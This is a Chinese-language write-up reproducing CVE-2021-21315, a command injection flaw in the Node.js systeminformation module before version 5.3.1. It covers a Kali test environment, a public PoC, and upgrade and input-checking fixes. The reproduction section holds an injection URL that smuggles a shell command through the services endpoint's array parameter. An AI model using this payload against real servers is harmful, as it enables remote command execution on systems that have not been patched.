## 0x00 简介

Node.js是一个基于Chrome
V8引擎的JavaScript运行环境，用于方便的搭建响应速度快、易于拓展的网络应用。Node使用Module模块划分不同的功能，每一个模块都包含非常丰富的函数，如http就包含了和http相关的很多函数，帮助开发者对http、tcp/udp等进行操作或创建相关服务器。

## 0x01 漏洞概述

Node.js-systeminformation是用于获取各种系统信息的Node.js模块,在存在命令注入漏洞的版本中，攻击者可以通过未过滤的参数中注入payload执行系统命令。

## 0x02 影响版本

> Systeminformation<5.3.1

## 0x03 环境搭建

本次测试环境使用的是kali 2020.4版本，首先下载受影响的Node.js,这里使用的是v12.18.4。

> wgethttps://nodejs.org/dist/v12.18.4/node-v12.18.4-linux-x64.tar.xz

![20210803203652.png](https://image.3001.net/images/20210812/1628733323_61147f8b5e693689c9dbb.png!small)

解压

> tar -xvfnode-v12.18.4-linux-x64.tar.xz

为了后续方便，更换文件名字为nodejs，并将该文件移至 /usr/local/sbin/目录下

> mvnode-v12.18.4-linux-x64 nodejs  
> mvnodejs/ /usr/local/sbin/

更换文件node和npm的软连接

> ln-s/usr/local/sbin/nodejs/bin/node /usr/local/bin/  
> ln-s/usr/local/sbin/nodejs/bin/npm /usr/local/bin/

![20210803204151.png](https://image.3001.net/images/20210812/1628733324_61147f8c69f2d0ef9f02c.png!small)

运行node.js看是否配置成功

![20210803204316.png](https://image.3001.net/images/20210812/1628733325_61147f8d30a5586653fa3.png!small)

## 0x04 漏洞复现

解压poc, poc链接<https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC>

![20210803204356.png](https://image.3001.net/images/20210812/1628733326_61147f8e07d2e67677bcf.png!small)

运行 index.js

![20210803204626.png](https://image.3001.net/images/20210812/1628733326_61147f8ed24bcf2a2be8e.png!small)

浏览器打开

> http://ip:8000/api/getServices?name[]=$(echo -e 'zeeker' > test.txt)

这里直接指向本地

![20210803205215.png](https://image.3001.net/images/20210812/1628733327_61147f8f921a27188a5b8.png!small)

查看

![20210803205338.png](https://image.3001.net/images/20210812/1628733328_61147f9070418a458c190.png!small)

发现存在test.txt文件

![20210803205439.png](https://image.3001.net/images/20210812/1628733329_61147f91491da8e7a2be8.png!small)

## 0x05 修复建议

该漏洞已经修复，将systeminformation升级至5.3.1或更高版本即可

链接：<https://www.npmjs.com/package/systeminformation>

若无法升级，检查或清理传递给
si.inetLatency()、si.inetChecksite()、si.services()、si.processLoad() 的参数，只允许使用
string，拒绝使用任何数组。

